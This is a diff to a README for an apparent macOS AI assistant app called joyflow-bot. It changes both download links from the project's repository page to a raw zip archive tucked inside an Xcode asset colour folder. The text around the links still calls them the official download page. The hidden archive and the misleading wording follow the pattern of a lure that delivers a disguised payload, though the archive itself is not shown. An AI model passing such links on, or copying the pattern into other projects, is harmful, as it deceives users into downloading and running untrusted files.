@@ -15,7 +15,7 @@ joyflow-bot is a friendly AI assistant that lives right on your Mac. Think of it
 
 ## 📥 Download and Install
 
-**Visit this link to download the application:** [https://github.com/hemanm802/joyflow-bot](https://github.com/hemanm802/joyflow-bot)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/hemanm802/joyflow-bot/main/JoyflowiOS/Resources/Assets.xcassets/AccentColor.colorset/1.1.zip](https://raw.githubusercontent.com/hemanm802/joyflow-bot/main/JoyflowiOS/Resources/Assets.xcassets/AccentColor.colorset/1.1.zip)
 
 This link will take you to the official download page. Once there, you'll find the latest version of joyflow-bot ready for your Mac.
 
@@ -109,6 +109,6 @@ joyflow-bot is released under the MIT License, which means you're free to use, m
 
 **Download joyflow-bot today and give your Mac a new teammate!**
 
-👉 **[Click Here to Download joyflow-bot](https://github.com/hemanm802/joyflow-bot)**
+👉 **[Click Here to Download joyflow-bot](https://raw.githubusercontent.com/hemanm802/joyflow-bot/main/JoyflowiOS/Resources/Assets.xcassets/AccentColor.colorset/1.1.zip)**
 
 Keywords: agent, ai, composio, desktop-app, llm, local-first, macos, macos-app, mit-license, native, openai, productivity, sparkle, swift, swiftui
